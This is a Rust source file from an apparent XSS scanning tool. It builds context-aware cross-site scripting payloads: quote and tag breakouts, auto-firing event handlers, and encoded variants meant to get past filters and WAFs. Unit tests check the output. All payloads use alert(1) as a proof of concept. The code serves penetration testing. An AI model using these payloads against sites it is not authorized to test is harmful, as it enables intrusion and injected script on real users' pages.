use crate::cmd::scan::ScanArgs;

use crate::parameter_analysis::{DelimiterType, InjectionContext};
use std::collections::HashMap;
use std::sync::{Mutex, OnceLock};

// Context-specific payload lists

static CUSTOM_PAYLOAD_CACHE: OnceLock<Mutex<HashMap<String, Vec<String>>>> = OnceLock::new();

/// Generate dynamic payloads based on the injection context
pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
    let mut payloads = Vec::new();

    match context {
        InjectionContext::Attribute(delimiter_type)
        | InjectionContext::AttributeUrl(delimiter_type) => {
            let url_like = matches!(context, InjectionContext::AttributeUrl(_));
            let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
            let attr_payloads = crate::payload::get_dynamic_xss_attribute_payloads();
            let protocol_payloads = crate::payload::get_protocol_injection_payloads();
            match delimiter_type {
                Some(DelimiterType::SingleQuote) => {
                    if url_like {
                        payloads.extend(protocol_payloads.iter().cloned());
                    }
                    for payload in html_payloads.iter() {
                        payloads.push(format!("'>{}'", payload));
                    }
                    for payload in attr_payloads.iter() {
                        payloads.push(format!("' {} a='", payload));
                    }
                    // Self-triggering event handler payloads (work even when < > are filtered)
                    let autotrigger_events = [
                        "onfocus=alert(1) autofocus",
                        "onmouseover=alert(1)",
                        "onfocus=alert(1) autofocus tabindex=0",
                        "ontoggle=alert(1) popover",
                        "onbeforeinput=alert(1) contenteditable",
                        "onsecuritypolicyviolation=alert(1)",
                        "onformdata=alert(1)",
                        "onslotchange=alert(1)",
                    ];
                    for ev in &autotrigger_events {
                        payloads.push(format!("' {} '", ev));
                        // Tab separator variant (bypasses space filtering)
                        payloads.push(format!("'\t{}\t'", ev));
                    }
                    if !url_like {
                        // Protocol payloads for src/href attributes (e.g. iframe src='VALUE')
                        // These don't need quote breaking since the protocol URI itself executes
                        for payload in protocol_payloads.iter() {
                            payloads.push(payload.clone());
                        }
                    }
                }
                Some(DelimiterType::DoubleQuote) => {
                    if url_like {
                        payloads.extend(protocol_payloads.iter().cloned());
                    }
                    for payload in html_payloads.iter() {
                        payloads.push(format!("\">{}\"", payload));
                    }
                    for payload in attr_payloads.iter() {
                        payloads.push(format!("\" {} \"", payload));
                    }
                    // Self-triggering event handler payloads (work even when < > are filtered)
                    let autotrigger_events = [
                        "onfocus=alert(1) autofocus",
                        "onmouseover=alert(1)",
                        "onfocus=alert(1) autofocus tabindex=0",
                        "ontoggle=alert(1) popover",
                        "onbeforeinput=alert(1) contenteditable",
                        "onsecuritypolicyviolation=alert(1)",
                        "onformdata=alert(1)",
                        "onslotchange=alert(1)",
                    ];
                    for ev in &autotrigger_events {
                        payloads.push(format!("\" {} \"", ev));
                        // Tab separator variant (bypasses space filtering)
                        payloads.push(format!("\"\t{}\t\"", ev));
                    }
                    if !url_like {
                        // Protocol payloads for src/href attributes (e.g. iframe src="VALUE")
                        for payload in protocol_payloads.iter() {
                            payloads.push(payload.clone());
                        }
                    }
                }
                _ => {
                    if url_like {
                        payloads.extend(protocol_payloads.iter().cloned());
                    }
                    payloads.extend(html_payloads);
                    payloads.extend(attr_payloads);
                    if !url_like {
                        // Protocol payloads for unquoted src/href attributes
                        payloads.extend(protocol_payloads);
                    }
                }
            }
        }
        InjectionContext::Javascript(delimiter_type) => match delimiter_type {
            Some(DelimiterType::SingleQuote) => {
                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
                    payloads.push(format!("'-{}-'", payload));
                    payloads.push(format!("'+{}+'", payload));
                }
            }
            Some(DelimiterType::DoubleQuote) => {
                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
                    payloads.push(format!("\"-{}-\"", payload));
                    payloads.push(format!("\"+{}+\"", payload));
                }
            }
            Some(DelimiterType::Comment) => {
                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
                    payloads.push(format!("*/{}/*", payload));
                    payloads.push(format!("\n{}", payload));
                }
            }
            _ => {
                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
                    // Base payload
                    payloads.push(payload.to_string());
                    // Augmented wrappers for broader execution contexts
                    payloads.push(format!("</script><script>{}</script>", payload));
                }
            }
        },
        InjectionContext::Html(delimiter_type) => {
            let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
            let mxss_payloads = crate::payload::get_mxss_payloads();
            let clobbering_payloads = crate::payload::get_dom_clobbering_payloads();
            // Short payloads without markers for truncated reflection contexts.
            // These are intentionally compact (<30 chars) so they survive server-side
            // length limits. They only yield [R] (reflected) findings, not [V].
            let short_payloads: Vec<String> = vec![
                "<svg/onload=alert(1)>".to_string(),
                "<img src=x onerror=alert(1)>".to_string(),
                "<svg onload=alert(1)>".to_string(),
                "<details open ontoggle=alert(1)>".to_string(),
            ];
            match delimiter_type {
                Some(DelimiterType::Comment) => {
                    for payload in short_payloads
                        .iter()
                        .chain(html_payloads.iter())
                        .chain(mxss_payloads.iter())
                        .chain(clobbering_payloads.iter())
                    {
                        payloads.push(format!("-->{}<!--", payload));
                    }
                }
                _ => {
                    payloads.extend(short_payloads);
                    payloads.extend(html_payloads);
                    payloads.extend(mxss_payloads);
                    payloads.extend(clobbering_payloads);
                }
            }
        }
        InjectionContext::Css(delimiter_type) => {
            // CSS injection: break out of <style> tag and inject HTML
            let class_marker = crate::scanning::markers::class_marker();
            let id_marker = crate::scanning::markers::id_marker();
            let breakout_tags = vec![
                format!("<IMG src=x onerror=alert(1) ClAss={}>", class_marker),
                format!("<SVG onload=alert(1) ClAss={}>", class_marker),
                format!("<SVG/onload=alert(1) id={}>", id_marker),
                format!("<SCRIPT>alert(1)</SCRIPT>"),
            ];
            match delimiter_type {
                Some(DelimiterType::SingleQuote) => {
                    for tag in &breakout_tags {
                        payloads.push(format!("');}}</style>{}", tag));
                        payloads.push(format!("');}}</style>{}<!--", tag));
                    }
                }
                Some(DelimiterType::DoubleQuote) => {
                    for tag in &breakout_tags {
                        payloads.push(format!("\");}}</style>{}", tag));
                        payloads.push(format!("\");}}</style>{}<!--", tag));
                    }
                }
                _ => {
                    for tag in &breakout_tags {
                        payloads.push(format!("</style>{}", tag));
                        payloads.push(format!("}}</style>{}", tag));
                        payloads.push(format!(";}}</style>{}", tag));
                    }
                }
            }
        }
    }

    payloads
}

/// Generate adaptive payloads using per-parameter analysis data (valid/invalid specials).
/// When a parameter has analysis data, this applies targeted encoding to bypass filters.
pub fn generate_adaptive_payloads(
    context: &InjectionContext,
    invalid_specials: &[char],
    valid_specials: &[char],
) -> Vec<String> {
    let base_payloads = generate_dynamic_payloads(context);

    // When angle brackets are blocked in an attribute context, prioritize event handler
    // payloads and skip HTML tag payloads to reduce noise and focus on what works.
    let angle_brackets_blocked = invalid_specials.contains(&'<') || invalid_specials.contains(&'>');

    let mut filtered_payloads: Vec<String> = if angle_brackets_blocked {
        match context {
            InjectionContext::Attribute(_)
            | InjectionContext::AttributeUrl(_)
            | InjectionContext::Html(_) => base_payloads
                .into_iter()
                .filter(|p| !p.contains('<') && !p.contains('>'))
                .collect(),
            _ => base_payloads,
        }
    } else {
        base_payloads
    };

    // When angle brackets are blocked, add marker-carrying event handler
    // payloads for DOM verification without needing new HTML tags.
    // These work in attribute context and also in HTML context when the
    // value is additionally reflected in attributes (which context
    // detection may miss).
    // Use id marker to avoid duplicate-attribute rejection by HTML5
    // parsers when the injection point is itself a class attribute.
    if angle_brackets_blocked {
        let add_attr_payloads = matches!(
            context,
            InjectionContext::Attribute(_)
                | InjectionContext::AttributeUrl(_)
                | InjectionContext::Html(_)
        );
        if add_attr_payloads {
            let id_marker = crate::scanning::markers::id_marker();
            let events = [
                "onfocus=alert(1) autofocus",
                "onmouseover=alert(1)",
                "onfocus=alert(1) autofocus tabindex=0",
                "ontoggle=alert(1) popover",
                "onbeforeinput=alert(1) contenteditable",
                "onsecuritypolicyviolation=alert(1)",
                "onformdata=alert(1)",
                "onslotchange=alert(1)",
            ];
            let delimiter = match context {
                InjectionContext::Attribute(d) | InjectionContext::AttributeUrl(d) => d.clone(),
                _ => None,
            };
            let (open_q, close_q) = match &delimiter {
                Some(DelimiterType::SingleQuote) => ("'", "'"),
                _ => ("\"", "\""),
            };
            for ev in &events {
                filtered_payloads.push(format!("{} {} id={} {}", open_q, ev, id_marker, close_q));
                // Tab separator variant for space-filtered contexts
                filtered_payloads
                    .push(format!("{}\t{}\tid={}\t{}", open_q, ev, id_marker, close_q));
            }
        }
    }

    // Use adaptive encoders from the encoding module
    let adaptive_encoders =
        crate::encoding::generate_adaptive_encodings(invalid_specials, valid_specials);

    // Apply adaptive encoders with pre-allocated capacity
    let estimated_cap = filtered_payloads.len() * (2 + adaptive_encoders.len());
    let mut out = Vec::with_capacity(estimated_cap);
    let mut seen = std::collections::HashSet::with_capacity(estimated_cap);
    for p in &filtered_payloads {
        // Original - insert reference to avoid clone when already seen
        if seen.insert(p.clone()) {
            out.push(p.clone());
        }
        // Adaptive variants based on what's blocked
        let adaptive_variants = crate::encoding::apply_adaptive_encoding(p, invalid_specials);
        for v in adaptive_variants {
            if seen.insert(v.clone()) {
                out.push(v);
            }
        }
        // Standard encoder variants
        for enc in &adaptive_encoders {
            let v = match enc.as_str() {
                "url" => crate::encoding::url_encode(p),
                "html" => crate::encoding::html_entity_encode(p),
                "2url" => crate::encoding::double_url_encode(p),
                "3url" => crate::encoding::triple_url_encode(p),
                "4url" => crate::encoding::quadruple_url_encode(p),
                "unicode" => crate::encoding::unicode_fullwidth_encode(p),
                "zwsp" => crate::encoding::zero_width_encode(p),
                _ => continue,
            };
            if seen.insert(v.clone()) {
                out.push(v);
            }
        }
    }
    out
}

pub fn load_custom_payloads(path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let cache = CUSTOM_PAYLOAD_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Ok(guard) = cache.lock()
        && let Some(cached) = guard.get(path)
    {
        return Ok(cached.clone());
    }

    let content = std::fs::read_to_string(path)?;
    let payloads: Vec<String> = content.lines().map(|s| s.to_string()).collect();

    if let Ok(mut guard) = cache.lock() {
        guard.insert(path.to_string(), payloads.clone());
    }

    Ok(payloads)
}

pub fn get_dynamic_payloads(
    context: &InjectionContext,
    args: &ScanArgs,
) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut base_payloads = vec![];

    if args.only_custom_payload {
        if let Some(path) = &args.custom_payload {
            base_payloads.extend(load_custom_payloads(path)?);
        }
    } else {
        base_payloads.extend(generate_dynamic_payloads(context));
        if let Some(path) = &args.custom_payload {
            base_payloads.extend(load_custom_payloads(path)?);
        }
    }

    // Include remote payloads if available (initialized via --remote-payloads at runtime)
    if let Some(remotes) = crate::payload::get_remote_payloads()
        && !remotes.is_empty()
    {
        base_payloads.extend(remotes.iter().cloned());
    }

    // Apply custom alert value substitution (--custom-alert-value / --custom-alert-type)
    let base_payloads = if args.custom_alert_value != "1" || args.custom_alert_type == "str" {
        let val = if args.custom_alert_type == "str" {
            format!("'{}'", args.custom_alert_value)
        } else {
            args.custom_alert_value.clone()
        };
        base_payloads
            .into_iter()
            .map(|p| {
                p.replace("alert(1)", &format!("alert({})", val))
                    .replace("confirm(1)", &format!("confirm({})", val))
                    .replace("prompt(1)", &format!("prompt({})", val))
                    .replace("alert`1`", &format!("alert`{}`", val))
                    .replace("prompt`1`", &format!("prompt`{}`", val))
                    .replace("confirm`1`", &format!("confirm`{}`", val))
                    // Comma operator / indirect call patterns: (0,alert)(1)
                    .replace(",alert)(1)", &format!(",alert)({})", val))
                    .replace(",confirm)(1)", &format!(",confirm)({})", val))
                    // Optional chaining: alert?.(1)
                    .replace("alert?.(1)", &format!("alert?.({})", val))
                    // Reflect.apply(alert,null,[1])
                    .replace("alert,null,[1])", &format!("alert,null,[{}])", val))
            })
            .collect()
    } else {
        base_payloads
    };

    // Expand with shared encoder policy helper; handles "none" and deduplication
    let payloads = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);

    Ok(payloads)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_dynamic_payloads_comment() {
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Html(Some(DelimiterType::Comment)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("-->")));
        let cls = crate::scanning::markers::class_marker().to_lowercase();
        assert!(payloads.iter().any(|p| {
            p.to_lowercase()
                .contains(&format!("<svg onload=alert(1) class={}>", cls))
        }));
    }

    #[test]
    fn test_generate_dynamic_payloads_string_double() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"")));
        assert!(
            payloads
                .iter()
                .any(|p| p.starts_with("\"") && p.ends_with("\""))
        );
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(None));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("onerror=alert(1)")));
        let cls = crate::scanning::markers::class_marker().to_lowercase();
        assert!(payloads.iter().any(|p| {
            p.to_lowercase()
                .contains(&format!("<img src=x onerror=alert(1) class={}>", cls))
        }));
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute_single_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
            DelimiterType::SingleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("'")));
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute_double_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"")));
    }

    #[test]
    fn test_generate_dynamic_payloads_url_attribute_prioritizes_protocols() {
        let payloads = generate_dynamic_payloads(&InjectionContext::AttributeUrl(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(
            payloads[0].starts_with("javascript:")
                || payloads[0].starts_with("Javascript:")
                || payloads[0].starts_with("jAvAsCrIpT:")
                || payloads[0].starts_with("data:text/html,"),
            "expected URL-bearing attribute payloads to start with protocol vectors, got {}",
            payloads[0]
        );
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(None));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p == "alert(1)"));
        assert!(
            payloads
                .iter()
                .any(|p| p == "</script><script>alert(1)</script>")
        );
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript_single_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
            DelimiterType::SingleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("'")));
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript_double_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"")));
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript_comment() {
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Javascript(Some(DelimiterType::Comment)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("*/")));
        assert!(payloads.iter().any(|p| p.starts_with("\n")));
    }

    #[test]
    fn test_generate_dynamic_payloads_comment_single_quote() {
        // With the new representation, comment context is represented via Html(Some(Comment))
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Html(Some(DelimiterType::Comment)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("-->")));
    }

    #[test]
    fn test_generate_dynamic_payloads_comment_double_quote() {
        // With the new representation, comment context is represented via Html(Some(Comment))
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Html(Some(DelimiterType::Comment)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("-->")));
    }

    #[test]
    fn test_generate_dynamic_payloads_html() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Html(None));
        assert!(!payloads.is_empty());
        let cls = crate::scanning::markers::class_marker().to_lowercase();
        assert!(payloads.iter().any(|p| {
            p.to_lowercase() == format!("<img src=x onerror=alert(1) class={}>", cls)
        }));
    }

    #[test]
    fn test_get_dynamic_payloads_basic() {
        let context = InjectionContext::Html(None);
        let args = ScanArgs {
            input_type: "auto".to_string(),
            format: "json".to_string(),
            targets: vec![],
            param: vec![],
            data: None,
            headers: vec![],
            cookies: vec![],
            method: "GET".to_string(),
            user_agent: None,
            cookie_from_raw: None,
            include_url: vec![],
            exclude_url: vec![],
            ignore_param: vec![],
            out_of_scope: vec![],
            out_of_scope_file: None,
            mining_dict_word: None,
            skip_mining: false,
            skip_mining_dict: false,
            skip_mining_dom: false,
            only_discovery: false,
            skip_discovery: false,
            skip_reflection_header: false,
            skip_reflection_cookie: false,
            skip_reflection_path: false,
            timeout: 10,
            delay: 0,
            proxy: None,
            follow_redirects: false,
            ignore_return: vec![],
            output: None,
            include_request: false,
            include_response: false,
            include_all: false,
            no_color: false,
            silence: false,
            dry_run: false,
            poc_type: "plain".to_string(),
            limit: None,
            limit_result_type: "all".to_string(),
            only_poc: vec![],
            workers: 10,
            max_concurrent_targets: 10,
            max_targets_per_host: 100,
            encoders: vec!["url".to_string(), "html".to_string()],
            custom_blind_xss_payload: None,
            blind_callback_url: None,
            custom_payload: None,
            only_custom_payload: false,
            inject_marker: None,
            custom_alert_value: "1".to_string(),
            custom_alert_type: "none".to_string(),
            skip_xss_scanning: false,
            deep_scan: false,
            sxss: false,
            sxss_url: None,
            sxss_method: "GET".to_string(),
            skip_ast_analysis: false,
            hpp: false,
            waf_bypass: "auto".to_string(),
            skip_waf_probe: false,
            force_waf: None,
            waf_evasion: false,
            remote_payloads: vec![],
            remote_wordlists: vec![],
        };

        let payloads = get_dynamic_payloads(&context, &args).unwrap();
        assert!(!payloads.is_empty());
        // Check that original payloads are included
        let cls = crate::scanning::markers::class_marker().to_lowercase();
        assert!(payloads.iter().any(|p| {
            p.to_lowercase() == format!("<img src=x onerror=alert(1) class={}>", cls)
        }));
        // Check encoded versions
        assert!(payloads.iter().any(|p| p.contains("%3C")));
        assert!(payloads.iter().any(|p| p.contains("&#x")));
        // Check that safe-tag breakout payloads are included
        assert!(
            payloads.iter().any(|p| p.contains("</title>")),
            "should contain title breakout payloads"
        );
        assert!(
            payloads.iter().any(|p| p.contains("</textarea>")),
            "should contain textarea breakout payloads"
        );
    }

    #[test]
    fn test_get_dynamic_payloads_only_custom() {
        let context = InjectionContext::Html(None);
        let args = ScanArgs {
            input_type: "auto".to_string(),
            format: "json".to_string(),
            targets: vec![],
            param: vec![],
            data: None,
            headers: vec![],
            cookies: vec![],
            method: "GET".to_string(),
            user_agent: None,
            cookie_from_raw: None,
            include_url: vec![],
            exclude_url: vec![],
            ignore_param: vec![],
            out_of_scope: vec![],
            out_of_scope_file: None,
            mining_dict_word: None,
            skip_mining: false,
            skip_mining_dict: false,
            skip_mining_dom: false,
            only_discovery: false,
            skip_discovery: false,
            skip_reflection_header: false,
            skip_reflection_cookie: false,
            skip_reflection_path: false,
            timeout: 10,
            delay: 0,
            proxy: None,
            follow_redirects: false,
            ignore_return: vec![],
            output: None,
            include_request: false,
            include_response: false,
            include_all: false,
            no_color: false,
            silence: false,
            dry_run: false,
            poc_type: "plain".to_string(),
            limit: None,
            limit_result_type: "all".to_string(),
            only_poc: vec![],
            workers: 10,
            max_concurrent_targets: 10,
            max_targets_per_host: 100,
            encoders: vec!["none".to_string()],
            custom_blind_xss_payload: None,
            blind_callback_url: None,
            custom_payload: Some("test_payloads.txt".to_string()),
            only_custom_payload: true,
            inject_marker: None,
            custom_alert_value: "1".to_string(),
            custom_alert_type: "none".to_string(),
            skip_xss_scanning: false,
            deep_scan: false,
            sxss: false,
            sxss_url: None,
            sxss_method: "GET".to_string(),
            skip_ast_analysis: false,
            hpp: false,
            waf_bypass: "auto".to_string(),
            skip_waf_probe: false,
            force_waf: None,
            waf_evasion: false,
            remote_payloads: vec![],
            remote_wordlists: vec![],
        };

        // This will fail if file doesn't exist, but for test structure it's fine
        let result = get_dynamic_payloads(&context, &args);
        // In real test, we'd create a temp file
        assert!(result.is_err()); // Since file doesn't exist
    }

    #[test]
    fn test_get_dynamic_payloads_no_encoders() {
        let context = InjectionContext::Html(None);
        let args = ScanArgs {
            input_type: "auto".to_string(),
            format: "json".to_string(),
            targets: vec![],
            param: vec![],
            data: None,
            headers: vec![],
            cookies: vec![],
            method: "GET".to_string(),
            user_agent: None,
            cookie_from_raw: None,
            include_url: vec![],
            exclude_url: vec![],
            ignore_param: vec![],
            out_of_scope: vec![],
            out_of_scope_file: None,
            mining_dict_word: None,
            skip_mining: false,
            skip_mining_dict: false,
            skip_mining_dom: false,
            only_discovery: false,
            skip_discovery: false,
            skip_reflection_header: false,
            skip_reflection_cookie: false,
            skip_reflection_path: false,
            timeout: 10,
            delay: 0,
            proxy: None,
            follow_redirects: false,
            ignore_return: vec![],
            output: None,
            include_request: false,
            include_response: false,
            include_all: false,
            no_color: false,
            silence: false,
            dry_run: false,
            poc_type: "plain".to_string(),
            limit: None,
            limit_result_type: "all".to_string(),
            only_poc: vec![],
            workers: 10,
            max_concurrent_targets: 10,
            max_targets_per_host: 100,
            encoders: vec!["none".to_string()],
            custom_blind_xss_payload: None,
            blind_callback_url: None,
            custom_payload: None,
            only_custom_payload: false,
            inject_marker: None,
            custom_alert_value: "1".to_string(),
            custom_alert_type: "none".to_string(),
            skip_xss_scanning: false,
            deep_scan: false,
            sxss: false,
            sxss_url: None,
            sxss_method: "GET".to_string(),
            skip_ast_analysis: false,
            hpp: false,
            waf_bypass: "auto".to_string(),
            skip_waf_probe: false,
            force_waf: None,
            waf_evasion: false,
            remote_payloads: vec![],
            remote_wordlists: vec![],
        };

        let payloads = get_dynamic_payloads(&context, &args).unwrap();
        assert!(!payloads.is_empty());
        // Should only have original payloads, no encoded ones
        assert!(
            payloads
                .iter()
                .all(|p| !p.contains("%3C") && !p.contains("&#x"))
        );
    }
}
